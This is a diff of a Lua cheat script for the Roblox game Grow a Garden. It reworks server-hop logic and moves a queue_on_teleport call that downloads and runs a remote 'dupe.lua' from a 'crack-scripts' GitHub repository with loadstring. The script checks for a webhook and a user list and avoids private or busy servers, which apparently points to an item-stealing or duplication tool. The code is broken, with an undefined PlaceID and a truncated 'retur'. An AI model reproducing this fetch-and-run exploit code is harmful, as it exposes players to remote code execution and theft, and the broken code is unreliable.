@@ -13,10 +13,11 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
-local PlaceID = game.PlaceID
 
 local plr = Players.LocalPlayer
 local backpack = plr:WaitForChild("Backpack")
+local character = plr.Character or plr.CharacterAdded:Wait()
+
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local modules = replicatedStorage:WaitForChild("Modules")
 local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
@@ -24,7 +25,6 @@ local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUt
 local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 local dataService = require(modules:WaitForChild("DataService"))
-local character = plr.Character or plr.CharacterAdded:Wait()
 
 --[[
 ================================================================================
@@ -33,21 +33,22 @@ SERVER HOP
 
 ================================================================================
 ]]
-pcall(function()
-    queue_on_teleport([[
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/crack-scripts/Grow-A-Garden/refs/heads/main/dupe.lua"))()
-    ]])
-end)
-
 local function serverHop()
+    pcall(function()
+        queue_on_teleport([[
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/crack-scripts/Grow-A-Garden/refs/heads/main/dupe.lua"))()
+        ]])
+    end)
+
     local servers = {}
     local cursor = ""
 
     repeat
+        local url = "https://games.roblox.com/v1/games/"..PlaceID.."/servers/Public?sortOrder=Asc&limit=100"
+        if cursor ~= "" then url = url.."&cursor="..cursor end
+
         local success, result = pcall(function()
-            return HttpService:JSONDecode(
-                game:HttpGet("https://games.roblox.com/v1/games/"..PlaceID.."/servers/Public?sortOrder=Asc&limit=100&cursor="..cursor)
-            )
+            return HttpService:JSONDecode(game:HttpGet(url))
         end)
 
         if success and result and result.data then
@@ -69,31 +70,35 @@ local function serverHop()
     end
 end
 
-local hopNeeded = false
+local function needsHop()
+    if next(users) == nil or webhook == "" then
+        return true
+    end
 
-if next(users) == nil or webhook == "" then
-    hopNeeded = true
+    if game.PlaceId ~= PlaceID then
+        return true
+    end
+
+    if #Players:GetPlayers() >= 5 then
+        return true
+    end
+
+    local ok, serverType = pcall(function()
+        return ReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
+    end)
+
+    if ok and serverType == "VIPServer" then
+        return true
+    end
+
+    return false
 end
 
-if game.PlaceId ~= 126884695634066 then
-    hopNeeded = true
-end
-
-if #Players:GetPlayers() >= 5 then
-    hopNeeded = true
-end
-
-local okVIP, serverType = pcall(function()
-    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
-end)
-
-if okVIP and serverType == "VIPServer" then
-    hopNeeded = true
-end
-
-if hopNeeded then
+if needsHop() then
     serverHop()
+    retur
 end
+
 
 -- =============================================================================
 
